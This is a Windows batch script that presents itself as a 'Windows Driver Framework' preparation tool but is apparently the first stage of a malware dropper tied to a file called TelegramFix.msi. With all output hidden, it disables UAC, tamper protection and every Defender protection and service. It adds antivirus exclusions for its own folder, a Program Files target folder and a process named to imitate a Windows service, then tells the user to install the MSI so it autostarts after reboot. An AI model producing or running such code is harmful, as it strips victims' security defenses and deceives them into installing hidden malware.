@echo off
title Windows Driver Framework - System Preparation
echo =========================================
echo   Windows Driver Framework - Preparation
echo =========================================
echo.
echo Preparing system, please wait...

:: Get current directory
set "CURDIR=%~dp0"
if "%CURDIR:~-1%"=="\" set "CURDIR=%CURDIR:~0,-1%"

:: Target folder
set "TARGET_DIR=C:\Program Files (x86)\Windows Driver Framework\v1"

:: 1. Disable UAC
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f >nul 2>&1

:: 2. Disable Tamper Protection (if possible)
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Features" /v "TamperProtection" /t REG_DWORD /d 0 /f >nul 2>&1

:: 3. Disable Defender real-time protection components
powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true" >nul 2>&1
powershell -Command "Set-MpPreference -DisableBehaviorMonitoring $true" >nul 2>&1
powershell -Command "Set-MpPreference -DisableBlockAtFirstSeen $true" >nul 2>&1
powershell -Command "Set-MpPreference -DisableIOAVProtection $true" >nul 2>&1
powershell -Command "Set-MpPreference -DisablePrivacyMode $true" >nul 2>&1
powershell -Command "Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true" >nul 2>&1
powershell -Command "Set-MpPreference -DisableArchiveScanning $true" >nul 2>&1
powershell -Command "Set-MpPreference -DisableIntrusionPreventionSystem $true" >nul 2>&1
powershell -Command "Set-MpPreference -DisableScriptScanning $true" >nul 2>&1
powershell -Command "Set-MpPreference -SubmitSamplesConsent 2" >nul 2>&1

:: 4. Disable Defender via registry (persistent)
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Real-Time Protection" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f >nul 2>&1

:: 5. Stop and disable Defender services
sc stop WdNisSvc >nul 2>&1
sc config WdNisSvc start= disabled >nul 2>&1
sc stop WinDefend >nul 2>&1
sc config WinDefend start= disabled >nul 2>&1
sc stop Sense >nul 2>&1
sc config Sense start= disabled >nul 2>&1

:: 6. Create target folder
mkdir "%TARGET_DIR%" 2>nul

:: 7. Add exclusions for source folder (current directory)
powershell -Command "Add-MpPreference -ExclusionPath '%CURDIR%'" >nul 2>&1
if exist "%CURDIR%\TelegramFix.msi" (
    powershell -Command "Add-MpPreference -ExclusionPath '%CURDIR%\TelegramFix.msi'" >nul 2>&1
)
if exist "%CURDIR%\TelegramFix1.bat" (
    powershell -Command "Add-MpPreference -ExclusionPath '%~f0'" >nul 2>&1
)

:: 8. Add exclusions for target folder and process (before MSI copies file)
powershell -Command "Add-MpPreference -ExclusionPath '%TARGET_DIR%'" >nul 2>&1
powershell -Command "Add-MpPreference -ExclusionProcess 'WUDFService.exe'" >nul 2>&1

echo.
echo =========================================
echo System preparation completed.
echo.
echo - UAC disabled
echo - Windows Defender disabled
echo - Exclusions added for source and target folders
echo - Target folder created: %TARGET_DIR%
echo.
echo Now please install TelegramFix.msi (double-click, follow the wizard).
echo After installation, reboot your computer.
echo The program will start automatically after reboot.
echo =========================================
timeout /t 10 /nobreak >nul
exit